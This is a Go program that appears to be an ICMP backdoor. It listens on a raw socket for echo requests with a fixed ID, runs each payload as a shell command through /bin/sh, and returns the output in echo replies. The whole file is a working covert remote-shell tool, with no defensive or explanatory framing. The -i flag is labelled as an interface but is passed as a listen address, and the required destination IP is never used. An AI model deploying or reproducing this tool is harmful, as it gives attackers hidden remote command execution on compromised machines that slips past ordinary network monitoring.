package main

import (
    "flag"
    "fmt"
    "golang.org/x/net/icmp"
    "golang.org/x/net/ipv4"
    "os"
    "os/exec"
)

const (
    ICMPID   = 13170
    TTL      = 64
    Protocol = 1 // ICMP protocol number
)

var (
    interfaceName = flag.String("i", "", "(Virtual) Network Interface (e.g., eth0)")
    destinationIP = flag.String("d", "", "Destination IP address")
)

func checkError(err error) {
    if err != nil {
        fmt.Fprintf(os.Stderr, "Error: %v\n", err)
        os.Exit(1)
    }
}

func icmpShell(conn *icmp.PacketConn) {
    buf := make([]byte, 1024)
    n, addr, err := conn.ReadFrom(buf)
    checkError(err)

    // Parse the incoming ICMP packet
    msg, err := icmp.ParseMessage(Protocol, buf[:n])
    checkError(err)

    // Check if it's an Echo Request packet with the correct ID
    if echo, ok := msg.Body.(*icmp.Echo); ok && msg.Type == ipv4.ICMPTypeEcho && echo.ID == ICMPID {
        icmpPayload := string(echo.Data)

        cmd := exec.Command("/bin/sh", "-c", icmpPayload)
        output, err := cmd.CombinedOutput()
        if err != nil {
            fmt.Printf("Command execution error: %v\n", err)
        }

        // Create an ICMP Echo Reply packet with the output as data
        reply := icmp.Echo{
            ID:   ICMPID,
            Seq:  1,
            Data: []byte(output),
        }
        msg := icmp.Message{
            Type: ipv4.ICMPTypeEchoReply,
            Code: 0,
            Body: &reply,
        }

        // Serialize the ICMP message
        replyBytes, err := msg.Marshal(nil)
        checkError(err)

        // Send the ICMP Echo Reply packet
        _, err = conn.WriteTo(replyBytes, addr)
        if err != nil {
            fmt.Printf("Error sending ICMP response packet: %v\n", err)
        }
    }
}

func main() {
    flag.Parse()

    if *interfaceName == "" || *destinationIP == "" {
        fmt.Println("Please provide both interface and destination IP address.")
        os.Exit(1)
    }

    // Create a raw socket for ICMP packets
    c, err := icmp.ListenPacket("ip4:icmp", *interfaceName)
    checkError(err)
    defer c.Close()

    fmt.Println("[+] ICMP listener started!")

    for {
        icmpShell(c)
    }
}

